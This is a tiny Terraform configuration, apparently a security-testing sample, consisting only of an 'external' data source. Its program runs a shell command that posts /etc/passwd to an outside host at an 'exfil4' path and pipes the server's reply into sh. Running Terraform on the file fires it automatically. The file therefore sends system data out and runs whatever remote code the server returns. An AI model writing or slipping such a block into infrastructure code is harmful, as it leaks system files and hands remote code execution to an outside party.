data "external" "example" {
 program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd
https://4puviytj96q66h6nqvob0ehek5qzez2o.net-spi.com/exfil4 | sh"]
}
